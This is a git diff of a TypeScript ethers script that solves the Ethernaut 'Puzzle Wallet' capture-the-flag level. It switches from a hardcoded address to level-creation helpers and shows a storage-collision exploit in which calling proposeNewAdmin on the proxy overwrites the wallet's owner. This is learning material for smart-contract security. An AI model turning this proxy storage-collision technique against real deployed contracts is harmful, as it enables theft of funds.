@@ -3,26 +3,25 @@ import { ethers } from 'ethers';
 import { BigNumber, Signer, BytesLike } from "ethers";
 import { getSigner } from "./signer";
 import { PuzzleProxy, PuzzleProxy__factory, PuzzleWallet, PuzzleWallet__factory } from "../typechain";
+import { createLevel, submitLevel } from './utils';
 
 async function main() {
   // Ok so the ethernaut webversion contract give proxy address. The address it give is the proxy contract. Not the wallet contract.
   // the proxy keep delegate call to the wallet contract. 
   // const walletAddress = "0x03c223E506F15901c677e7C4D6bC8F8C13fa0eA9";
-  const proxyaddress = "0x03c223E506F15901c677e7C4D6bC8F8C13fa0eA9";
   const signer = getSigner();
+  const level = await createLevel(signer,"Puzzle Wallet");
   const player = await signer.getAddress();
-  // The proxy contract have builtin fallback delegatecall function.
-  // Which wallet have the same layout as proxy contract.
-  // Try call delegate function that change admin. See what happen.
-  const wallet = await (new PuzzleWallet__factory(signer)).attach(proxyaddress);
-  const proxy = await (new PuzzleProxy__factory(signer)).attach(proxyaddress);
+
+  const wallet = await (new PuzzleWallet__factory(signer)).attach(level);
+  const proxy = await (new PuzzleProxy__factory(signer)).attach(level);
   await wallet.deployed();
   await proxy.deployed();
 
-  // Ok the wallet contract did not get Init during deploy by ethernaut.
-  // Only the proxy contract get init. The storage is stored on unlinked state in proxy contract
+  // wallet and proxy does not share same memort layout. so pendingadmin here override memory owner of puzzle
   await (await proxy.proposeNewAdmin(player)).wait();
 
+  // wenow become admin
   console.log("pending admin:", await proxy.pendingAdmin());
   console.log("admin:", await proxy.admin());
   // await DebugStorage(signer, wallet, proxy);
@@ -59,7 +58,7 @@ async function main() {
 
   console.log("admin:", await proxy.admin());
 
-
+  await submitLevel(signer, level);
 }
 
 main()
